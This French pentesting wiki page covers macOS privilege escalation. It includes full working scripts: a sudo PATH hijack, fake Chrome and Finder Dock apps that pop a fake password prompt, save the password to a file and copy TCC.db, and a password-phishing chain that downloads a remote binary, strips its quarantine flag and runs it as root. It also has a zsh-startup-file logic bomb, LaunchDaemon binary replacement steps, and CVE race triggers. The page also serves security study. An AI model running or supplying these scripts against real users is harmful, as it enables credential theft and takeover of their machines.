# Élévation de privilèges macOS

{{#include ../../banners/hacktricks-training.md}}

## Élévation de privilèges TCC

Si vous êtes arrivé ici en cherchant des informations sur l’élévation de privilèges TCC, consultez :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

De nombreuses techniques d’élévation de privilèges qui affectent Linux ou d’autres systèmes de type Unix s’appliquent également à macOS. Consultez :


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interaction avec l’utilisateur

### Sudo Hijacking

Vous trouverez la technique originale de [Sudo Hijacking dans l’article sur l’élévation de privilèges Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **conserve** le **`PATH`** de l’utilisateur lorsqu’il exécute **`sudo`**. Cela signifie qu’une autre façon de mener cette attaque consiste à **détourner d’autres binaires** que la victime exécutera tout de même lorsqu’elle **lance sudo :**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Notez qu’un utilisateur qui utilise le terminal aura très probablement **Homebrew installé**. Il est donc possible de détourner des binaires dans **`/opt/homebrew/bin`**.

### Dock Impersonation

Avec un peu de **social engineering**, vous pourriez **usurper l’identité de Google Chrome**, par exemple, dans le Dock et exécuter votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez si Chrome est présent dans le Dock. Si c’est le cas, **supprimez** cette entrée et **ajoutez** la **fausse** entrée **Chrome à la même position** dans le tableau du Dock.

<details>
<summary>Script d’usurpation de Chrome dans le Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- Vous **ne pouvez pas retirer Finder du Dock**. Donc, si vous comptez l’ajouter au Dock, vous pouvez placer le faux Finder juste à côté du vrai. Pour cela, vous devez **ajouter l’entrée du faux Finder au début du tableau du Dock**.
- Vous pouvez aussi ne pas le placer dans le Dock et simplement l’ouvrir : « Finder demande à contrôler Finder », ce n’est pas si étrange.
- Une autre option pour **escalate to root sans demander** le mot de passe, même si la boîte de dialogue est horrible, consiste à faire réellement demander le mot de passe par Finder pour effectuer une action privilégiée :
  - Demandez à Finder de copier un nouveau fichier **`sudo`** dans **`/etc/pam.d`**. (L’invite de mot de passe indiquera que « Finder veut copier sudo ».)
  - Demandez à Finder de copier un nouvel **Authorization Plugin**. (Vous pouvez choisir le nom du fichier afin que l’invite de mot de passe indique que « Finder veut copier Finder.bundle ».)

<details>
<summary>Script d’usurpation de Finder dans le Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Hameçonnage par invite de mot de passe + réutilisation de sudo

Les malwares abusent fréquemment de l’interaction avec l’utilisateur pour **capturer un mot de passe permettant d’utiliser sudo** et le réutiliser de manière programmatique. Déroulement courant :

1. Identifier l’utilisateur connecté avec `whoami`.
2. **Répéter les invites de mot de passe** jusqu’à ce que `dscl . -authonly "$user" "$pw"` renvoie un résultat positif.
3. Mettre en cache les identifiants (par ex. `/tmp/.pass`) et effectuer des actions privilégiées avec `sudo -S` (mot de passe transmis via stdin).

Exemple de chaîne minimale :

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Le mot de passe volé peut ensuite être réutilisé pour **supprimer la quarantaine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d’autres fichiers privilégiés, et exécuter des étapes supplémentaires sans interaction.<sup>[[1]](#references)</sup>

## Vecteurs propres aux versions récentes de macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges` toujours utilisable malgré sa dépréciation

`AuthorizationExecuteWithPrivileges` est obsolète depuis la version 10.7, mais **fonctionne toujours sur Sonoma/Sequoia**. De nombreux outils de mise à jour commerciaux invoquent `/usr/libexec/security_authtrampoline` avec un chemin non fiable. Si le binaire ciblé est modifiable par l’utilisateur, vous pouvez y placer un cheval de Troie et profiter de l’invite légitime :

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Combinez avec les **techniques de masquerading ci-dessus** pour afficher une boîte de dialogue de mot de passe crédible.


### Triage des helpers privilégiés / XPC

De nombreuses privescs macOS récentes de tiers suivent le même schéma : un **LaunchDaemon root** expose un **service Mach/XPC** depuis **`/Library/PrivilegedHelperTools`**, puis le helper ne **valide pas le client**, le valide **trop tard** (race condition sur le PID), ou expose une **méthode root** qui utilise un **chemin/script contrôlé par l’utilisateur**. Cette classe de vulnérabilité est à l’origine de nombreux bugs récents dans des helpers de clients VPN, de lanceurs de jeux et de programmes de mise à jour.<sup>[[2]](#references)</sup>

Liste de contrôle rapide pour le triage :

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Portez une attention particulière aux helpers qui :

- continuent d’accepter des requêtes **après la désinstallation** parce que le job est resté chargé dans `launchd`
- exécutent des scripts ou lisent leur configuration depuis **`/Applications/...`** ou d’autres chemins accessibles en écriture aux utilisateurs non-root
- reposent sur une validation des pairs **basée sur le PID** ou **uniquement sur le bundle-id**, qui peut être vulnérable à une race condition

Pour plus de détails sur les failles d’autorisation des helpers, consultez [cette page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Héritage de l’environnement des scripts PackageKit (CVE-2024-27822)

Jusqu’à ce qu’Apple corrige le problème dans **Sonoma 14.5**, **Ventura 13.6.7** et **Monterey 12.7.5**, les installations lancées par l’utilisateur via **`Installer.app`** / **`PackageKit.framework`** pouvaient exécuter des scripts PKG en tant que root dans l’environnement de l’utilisateur courant. Cela signifie qu’un package utilisant **`#!/bin/zsh`** chargeait le fichier **`~/.zshenv`** de l’attaquant et l’exécutait en tant que root lorsque la victime installait le package.<sup>[[3]](#references)</sup>

C’est particulièrement intéressant comme **logic bomb** : il suffit d’obtenir un foothold dans le compte de l’utilisateur et d’avoir accès en écriture à un fichier de démarrage du shell, puis d’attendre que l’utilisateur exécute un installateur vulnérable basé sur **zsh**. Cela ne s’applique généralement pas aux déploiements **MDM/Munki**, car ils s’exécutent dans l’environnement de l’utilisateur root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Si vous souhaitez approfondir les abus spécifiques aux installateurs, consultez également [cette page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Collision de destination de l’installateur via `.localized`

Certains installateurs tiers enregistrent un LaunchDaemon root dont l’exécutable est référencé par un chemin fixe dans `/Applications/Target.app`. Si un attaquant peut créer ce bundle en premier avec un **identifiant de bundle différent**, Installer peut conserver le leurre et placer l’application réelle dans `/Applications/Target.localized/Target.app`. Le daemon pointe toujours vers le chemin initial. Par conséquent, un exécutable contrôlé par l’attaquant dans le bundle leurre peut ensuite s’exécuter en tant que root.<sup>[[8]](#references)</sup>

Les prérequis importants sont les suivants :<sup>[[8]](#references)</sup>

1. L’attaquant peut créer ou contrôler le chemin d’application attendu.
2. Le package ne supprime pas le bundle en conflit.
3. La tâche privilégiée utilise un chemin codé en dur dans ce bundle.
4. L’utilisateur ou un workflow MDM installe le package et enregistre la tâche.

Recherchez les bundles déplacés, puis examinez les cibles LaunchDaemon avec la boucle d’énumération de la section suivante :<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Un installateur plus sûr résout l’emplacement final du bundle et conserve les exécutables privilégiés dans un emplacement appartenant à root, comme `/Library/PrivilegedHelperTools`. Il doit également vérifier le propriétaire et la signature du code avant d’enregistrer ou de démarrer le job.<sup>[[8]](#references)</sup>

### Détournement d’une cible LaunchDaemon inscriptible

Un plist LaunchDaemon peut appartenir à root alors que son entrée `Program` ou la première entrée de `ProgramArguments` pointe vers un répertoire où un utilisateur peut écrire. Vérifiez le **chemin complet**, pas uniquement les permissions de l’exécutable. Si le répertoire parent est inscriptible, un attaquant peut renommer un exécutable appartenant à root et créer un remplacement au même chemin. Le remplacement s’exécute en tant que root au prochain démarrage du job. Un redémarrage ou un redémarrage normal du service suffit. L’attaquant n’a pas besoin d’avoir la permission d’exécuter `launchctl bootstrap` dans le domaine système.<sup>[[7]](#references)</sup>

Énumérez d’abord chaque cible et son répertoire parent immédiat :<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Lorsque le fichier ou son répertoire parent est modifiable, conservez le binaire d’origine et remplacez le chemin par un payload exécutable. Attendez ensuite que le daemon déjà chargé redémarre.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### Course critique sur le pointeur d’identifiants XNU SMR (CVE-2025-24118)

Le chemin vulnérable `kauth_cred_proc_update` mettait à jour `proc_ro.p_ucred` avec l’API non atomique `zalloc_ro_mut`, tandis que les lecteurs SMR chargeaient le pointeur sans verrou. Le déclenchement public utilise un binaire setgid spécialement préparé. Un thread alterne entre ses identifiants de groupe réel et effectif, tandis qu’un autre thread appelle à répétition un syscall tel que `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Traitez cela comme une **primitive de race condition**, et non comme un exploit root prêt à l’emploi. Le PoC publié démontre un pointeur de credentials déchiré. Il se termine souvent par un kernel panic. Le chercheur n’a reproduit la corruption que sur Intel et n’a pas démontré de contrôle déterministe de l’objet credentials résultant. Apple a remplacé la mise à jour par un échange atomique de pointeur dans macOS 15.3.<sup>[[4]](#references)</sup>

### Contournement de SIP via l’Assistant migration (« Migraine », CVE-2023-32369)

Même si vous avez déjà root, SIP bloque toujours les écritures dans les emplacements système. La faille **Migraine** exploite l’entitlement de l’Assistant migration `com.apple.rootless.install.heritable` pour lancer un processus enfant qui hérite du contournement de SIP et écrase des chemins protégés (par exemple, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La chaîne :

1. Obtenir root sur un système en fonctionnement.
2. Déclencher `systemmigrationd` avec un état forgé pour lancer un binaire contrôlé par l’attaquant.
3. Utiliser l’entitlement hérité pour modifier des fichiers protégés par SIP, avec une persistance qui subsiste même après le redémarrage.

### NSPredicate/XPC expression smuggling (classe de failles CVE-2023-23530/23531)

Plusieurs daemons Apple acceptent des objets **NSPredicate** via XPC et ne valident que le champ `expressionType`, contrôlé par l’attaquant. En forgeant un prédicat qui évalue des sélecteurs arbitraires, il est possible d’obtenir une **exécution de code dans des services XPC root/système** (par exemple, `coreduetd`, `contextstored`). Associée à une évasion initiale du sandbox d’une app, cette faille permet une **escalade de privilèges sans demande de confirmation à l’utilisateur**. Recherchez les endpoints XPC qui désérialisent des prédicats sans utiliser de visitor robuste.<sup>[[6]](#references)</sup>

## TCC - Escalade de privilèges root

### CVE-2020-9771 - Contournement de TCC et escalade de privilèges via mount_apfs

**Tout utilisateur** (même sans privilèges) peut créer et monter un snapshot Time Machine avec `-o noowners` et **accéder à TOUS les fichiers** de ce snapshot, en contournant les vérifications de propriété appliquées au volume actif. Le seul privilège nécessaire est que l’application utilisée (comme `Terminal`) dispose de l’**accès complet au disque** (`kTCCServiceSystemPolicyAllfiles`).

Les commandes et l’explication complète figurent sur la page des contournements de TCC :

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informations sensibles

Cela peut être utile pour escalader les privilèges :


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, l’année de l’Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165 : escalade locale de privilèges via AWS Client VPN pour macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822 : escalade de privilèges via macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE : CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft « Migraine » : contournement de SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Une nouvelle classe de failles d’escalade de privilèges sur macOS et iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Détournement de LaunchDaemon : escalade de privilèges et persistance via des permissions de dossier non sécurisées](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE macOS via le répertoire .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
